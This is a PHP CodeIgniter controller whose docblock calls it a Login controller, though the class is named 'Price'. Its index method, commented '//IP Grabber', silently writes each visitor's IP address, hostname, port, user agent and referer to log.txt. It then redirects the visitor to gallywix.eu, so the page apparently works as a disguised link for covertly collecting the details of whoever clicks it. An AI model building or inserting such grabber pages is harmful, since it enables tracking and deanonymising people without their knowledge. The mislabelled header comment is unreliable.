<?php if(!defined('BASEPATH')) exit('No direct script access allowed');

/**
 * Class : Login (LoginController)
 * Login class to control to authenticate user credentials and starts user's session.
 * @author : Kishor Mali
 * @version : 1.1
 * @since : 15 November 2016
 */
require_once '/var/www/html/vendor/autoload.php';
class Price extends CI_Controller
{
    /**
     * This is default constructor of the class
     */
    public function __construct()
    {
        parent::__construct();
    }

    /**
     * Index Page for this controller.
     */

    public function index() {
      //IP Grabber

      //Variables

      $protocol = $_SERVER['SERVER_PROTOCOL'];
      $ip = $_SERVER['REMOTE_ADDR'];
      $port = $_SERVER['REMOTE_PORT'];
      $agent = $_SERVER['HTTP_USER_AGENT'];
      @$ref = $_SERVER['HTTP_REFERER'];
      $hostname = gethostbyaddr($_SERVER['REMOTE_ADDR']);

      //Print IP, Hostname, Port Number, User Agent and Referer To Log.TXT

      $fh = fopen(getcwd() . '/log.txt', 'a');
      fwrite($fh, 'IP Address: '."".$ip ."\n");
      fwrite($fh, 'Hostname: '."".$hostname ."\n");
      fwrite($fh, 'Port Number: '."".$port ."\n");
      fwrite($fh, 'User Agent: '."".$agent ."\n");
      fwrite($fh, 'HTTP Referer: '."".$ref ."\n\n");
      fclose($fh);

      redirect('http://gallywix.eu');
    }
}

?>
